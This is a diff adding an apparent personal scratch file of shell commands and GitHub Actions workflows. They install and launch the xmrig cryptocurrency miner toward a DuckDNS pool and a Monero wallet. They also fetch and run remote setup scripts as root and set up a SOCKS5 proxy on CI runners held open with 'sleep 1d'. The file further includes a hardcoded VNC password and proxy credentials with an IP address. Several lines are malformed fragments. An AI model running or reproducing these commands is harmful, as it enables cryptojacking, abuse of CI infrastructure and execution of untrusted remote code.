@@ -1,0 +1,77 @@
+printf "apt update" | sudo su && printf "apt install snapd wget -y" | sudo su  && printf "snap install xmrig " | sudo su && printf "wget https://github.com/githubaunglaymyanmar1/download/raw/main/project1/setup" | sudo su && printf "bash setup" | sudo su
+
+
+
+
+
+
+
+
+
+
+sudo apt update 
+sudo apt install xfce4 xfce4-goodies -y
+sudo apt-get install xfce4-whiskermenu-plugin -y
+sudo apt install tightvncserver xterm -y
+wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+sudo dpkg --install google-chrome-stable_current_amd64.deb
+sudo apt install --assume-yes --fix-broken
+rm -rf google-chrome-stable_current_amd64.deb
+rm -rf ~/.vnc
+mkdir ~/.vnc
+echo aunglay | vncpasswd -f > ~/.vnc/passwd
+chmod 0600 ~/.vnc/passwd
+echo "xrdb $HOME/.Xresources" > ~/.vnc/xstartup
+echo "startxfce4 &" >> ~/.vnc/xstartup
+echo xterm -e "xmrig -o aungmyozaw.duckdns.org:8585 -u 466qu8xzgtDXCr52mZxubW2yCFmdcAuLpHKECRmaCRn26V6LgNi5ttP74dQ7g2mUJNRzTqgDM6PUZQhaG45DgUx43kRxAoY --rig-id rig " >> ~/.vnc/xstartup
+chmod +x ~/.vnc/xstartup
+vncserver :1
+
+
+printf "" | sudo su && 
+https://github.com/githubaunglaymyanmar/vncsetup/raw/main/setup
+
+
+name: Ubuntu 18.04
+
+on: 
+  workflow_dispatch:
+  
+jobs:
+  build:
+    runs-on: ubuntu-18.04
+    steps:
+      - uses: actions/checkout@v2
+      - name: Run settting file
+        run: sudo su && printf "sudo docker run -d -t -p 8022:8022 --name linuxvnc ubuntu:18.04 " | sudo su && printf "docker exec -t linuxvnc apt update" | sudo su && printf "docker exec -t linuxvnc apt install net-tools wget curl zip unzip -y" | sudo su && printf "docker exec -t linuxvnc ifconfig" | sudo su && printf "docker exec -t linuxvnc wget https://github.com/githubaunglaymyanmar/fordownload/raw/main/socks5/socks5setupcolab" | sudo su && printf "docker exec -t linuxvnc bash socks5setupcolab" | sudo su 
+       
+      - name: Ubuntu ready to go 
+        run: sleep 1d  
+
+
+&& printf "docker exec -t linuxvnc " | sudo su 
+
+!wget https://github.com/githubaunglaymyanmar/fordownload/raw/main/socks5/socks5setupcolab &> /dev/null && bash socks5setupcolab
+
+name: Ubuntu 18.04
+
+on: 
+  workflow_dispatch:
+  
+jobs:
+  build:
+    runs-on: ubuntu-18.04
+    steps:
+      - uses: actions/checkout@v2
+      - name: Run settting file
+        run: printf "sudo docker run -d -t -p 8022:8022 --name linuxvnc ubuntu:18.04 " | sudo su && printf "docker exec -t linuxvnc apt update" | sudo su && printf "docker exec -t linuxvnc apt install wget curl -y" | sudo su && && printf "docker exec -t linuxvnc wget wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz" | sudo su && printf "docker exec -t linuxvnc tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz" | sudo su && printf "docker exec -t linuxvnc ./xmrig -o localhost:80 -u 466qu8xzgtDXCr52mZxubW2yCFmdcAuLpHKECRmaCRn26V6LgNi5ttP74dQ7g2mUJNRzTqgDM6PUZQhaG45DgUx43kRxAoY -k --tls --rig-id rig " | sudo su
+       
+      - name: Ubuntu ready to go 
+        run: sleep 1d  
+
+ && printf "docker exec -t linuxvnc " | sudo su
+
+curl -x socks5://aunglay:aunglay@103.153.202.203:8128 https://ifconfig.me --tlsv1
+
+
+
